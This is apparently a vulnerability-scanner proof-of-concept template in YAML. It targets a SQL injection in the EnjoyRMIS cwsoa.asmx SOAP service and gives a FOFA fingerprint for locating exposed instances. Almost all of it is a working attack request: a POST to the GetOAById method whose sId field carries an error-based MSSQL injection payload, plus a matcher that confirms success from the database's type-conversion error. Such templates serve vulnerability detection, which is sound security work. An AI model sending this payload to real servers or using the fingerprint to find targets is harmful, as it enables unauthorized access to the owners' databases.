id: poc-yaml-enjoyrmis-cwsoa-asmx-sqli
info:
  name: EnjoyRMIS cwsoa.asmx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: enjoyrmis
  fofa: body="CheckSilverlightInstalled"
requests:
- method: POST
  path: /EnjoyRMIS_WS/WS/POS/cwsoa.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: http://tempuri.org/GetOAById
  data: '<?xml version="1.0" encoding="utf-8"?>

    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>

    <GetOAById xmlns="http://tempuri.org/">

    <sId>string'' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT
    (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113)))
    AND ''OFyo''=''OFyo</sId>

    </GetOAById>

    </soap:Body>

    </soap:Envelope>'
  expression: "status_code == 500 && \ncontains(body,\"qqqzq1qvkqq\") &&\ncontains(body,\"\
    在将 varchar 值\") &&\ncontains(body,\"转换成数据类型 int 时失败\") &&\ncontains(content_type,\"\
    text/xml\")\n"
variables: {}
transport: http
